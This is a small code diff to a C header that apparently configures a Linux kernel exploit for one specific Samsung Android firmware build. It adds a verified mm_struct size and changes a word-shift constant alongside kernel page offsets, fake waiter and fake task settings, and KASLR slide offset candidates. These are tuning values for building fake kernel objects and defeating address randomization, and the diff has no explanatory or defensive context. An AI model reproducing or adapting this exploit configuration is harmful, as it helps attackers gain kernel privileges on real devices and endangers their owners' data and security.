@@ -15,6 +15,10 @@
 #define P0_PAGE_OFFSET 0xffffff8000000000ULL
 #define P0_PHYS_OFFSET 0x80000000ULL
 #define P0_KERNEL_PHYS_LOAD 0xa8000000ULL
+/* sizeof(struct mm_struct) on 6.6.30-abogkiS938BXXS5AYG4 — verified
+ * against BTF id=371.  Do NOT inherit the common.h 0x500 default; that
+ * value is from an older 5.x family. */
+#define MM_STRUCT_SZ 0x4c0
 #define SKB_DATA_DELTA (-0xe80LL)
 #define SLIDE_FAKE_WAITER_PRIO 0
 #define SLIDE_WAITER_WAKE_STATE 0
@@ -22,7 +26,7 @@
 #define SLIDE_USE_FAKE_TASK 1
 #define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x000d7ca0ULL
 #define SLIDE_TRACEFS_WORKER_CALLER_OFF_ALT  0x000d7eb8ULL
-#define SLIDE_PSELECT_WORD_SHIFT 3
+#define SLIDE_PSELECT_WORD_SHIFT 0
 
 #define SLIDE_P0_OFFSET_CANDIDATES \
   0x150000ULL, 0x100000ULL, 0x130000ULL, 0x090000ULL, \
